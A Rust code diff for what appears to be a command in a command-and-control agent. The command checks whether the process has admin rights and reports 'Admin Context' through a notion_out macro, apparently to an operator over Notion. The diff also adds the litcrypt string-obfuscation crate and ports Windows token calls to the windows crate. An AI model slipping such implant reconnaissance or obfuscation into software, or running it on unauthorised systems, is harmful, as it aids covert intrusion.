@@ -1,19 +1,30 @@
 use std::error::Error;
 use is_root::is_root;
+use litcrypt::lc;
 use crate::cmd::notion_out;
 
-#[cfg(windows)] use std::ptr::null_mut;
-#[cfg(windows)] use winapi::um::handleapi::CloseHandle;
-#[cfg(windows)] use winapi::um::processthreadsapi::GetCurrentProcess;
-#[cfg(windows)] use winapi::um::processthreadsapi::OpenProcessToken;
-#[cfg(windows)] use winapi::um::securitybaseapi::GetTokenInformation;
-#[cfg(windows)] use winapi::um::winnt::TokenElevation;
-#[cfg(windows)] use winapi::um::winnt::HANDLE;
-#[cfg(windows)] use winapi::um::winnt::TOKEN_ELEVATION;
-#[cfg(windows)] use libc;
 #[cfg(windows)] use std::mem;
-#[cfg(windows)] use winapi::ctypes::c_void;
-#[cfg(windows)] use winapi::um::winnt::TOKEN_QUERY;
+#[cfg(windows)] use std::ptr::null_mut;
+#[cfg(windows)] use std::ffi::c_void;
+#[cfg(windows)] use windows::{
+    core::{PSTR, PWSTR, PCWSTR},
+    Win32::{
+        Foundation::{
+            CloseHandle,
+            HANDLE
+        },
+        System::Threading::{
+            GetCurrentProcess,
+            OpenProcessToken
+        },
+        Security::{
+            GetTokenInformation,
+            TokenElevation,
+            TOKEN_ELEVATION,
+            TOKEN_QUERY
+        }
+    }
+};
 
 pub fn is_elevated() -> bool {
     #[cfg(not(windows))] {
@@ -22,7 +33,7 @@ pub fn is_elevated() -> bool {
     }
 
     #[cfg(windows)] {
-        let mut handle: HANDLE = null_mut();
+        let mut handle = HANDLE(0);
         unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle) };
 
         let elevation = unsafe { libc::malloc(mem::size_of::<TOKEN_ELEVATION>()) as *mut c_void };
@@ -30,7 +41,7 @@ pub fn is_elevated() -> bool {
         let mut ret_size = size;
         unsafe {
             GetTokenInformation(
-                handle,
+                &handle,
                 TokenElevation,
                 elevation,
                 size as u32,
@@ -39,9 +50,9 @@ pub fn is_elevated() -> bool {
         };
         let elevation_struct: TOKEN_ELEVATION = unsafe{ *(elevation as *mut TOKEN_ELEVATION)};
 
-        if !handle.is_null() {
+        if !handle.is_invalid() {
             unsafe {
-                CloseHandle(handle);
+                CloseHandle(&handle);
             }
         }
 
@@ -53,7 +64,5 @@ pub fn is_elevated() -> bool {
 pub async fn handle() -> Result<String, Box<dyn Error>> {
     // TODO: Implement Linux check
     let is_admin = is_elevated();  
-    println!("{}", is_admin);
-    Ok(format!("Admin Context: {is_admin}"))
-    
+    notion_out!("Admin Context: ", &is_admin.to_string())  
 }
